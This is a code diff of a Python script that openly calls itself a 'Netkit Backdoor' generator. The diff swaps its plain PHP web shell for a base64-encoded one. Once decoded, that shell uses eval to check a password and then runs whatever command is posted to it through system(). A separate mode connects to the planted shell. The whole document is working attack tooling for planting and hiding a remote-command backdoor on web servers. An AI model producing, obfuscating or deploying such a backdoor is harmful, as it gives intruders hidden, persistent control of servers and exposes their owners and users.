@@ -2,7 +2,8 @@
 import time,base64,urllib2,os,urllib,sys
 from Crypto.Hash import MD5
 h = MD5.new()
-
+phpcoder = 'JGEgPSAnJHBhc3N3b3JkID0gJF9QT1NUWyJwYXNzIl07JzsNCiRiID0gJyRwYXNzd29yZCA9IG1kNSgkcGFzc3dvcmQpOyc7DQokYyA9ICckY21kID0gJF9QT1NUWyJjbWQiXTsnOw0KJGQgPSAnJGRlbGJhY2sgPSAkX1BPU1RbImRlbHNlbGYiXTsgaWYoaXNzZXQoJHBhc3N3b3JkKSl7IGlmKCRwYXNzID09ICRwYXNzd29yZCkgeyBpZihpc3NldCgkY21kKSl7IHN5c3RlbSgkY21kKTsgfSB9ZWxzZXsgcHJpbnQgIlBhc3N3b3JkIjsgfSB9JzsNCmV2YWwoJGEuJGIuJGMuJGQpOyANCg=='
+phpcoder = base64.b64decode(phpcoder)
 msfip = ""
 msfport = ""
 class bcolors:
@@ -39,8 +40,9 @@ if len(sys.argv) == 4:
         mdpassword = h.hexdigest()
 	if sta == "--generate":
 	    fqx = open(sta2, "w")
-	    fqx.write('<?php error_reporting(0); $pass = "'+mdpassword+'"; $password = $_POST["pass"]; $password = md5($password); $cmd = $_POST["cmd"]; $delback = $_POST["delself"]; if(isset($password)){ if($pass == $password) { if(isset($cmd)){ system($cmd); } }else{ print "Password"; } } ?>')
-	    print "Netkit Backdoor File created in "+os.getcwd()+sta2
+
+	    fqx.write('<?php error_reporting(0); $pass = "'+mdpassword+'"; '+phpcoder+' ?>')
+	    print "Netkit Backdoor File created in "+os.getcwd()+"/"+sta2
 	elif sta == "--connect":
 	    if sta2 == "" or sta3 == "":
 		print bcolors.FAIL + "You must write url and password value" + bcolors.ENDC
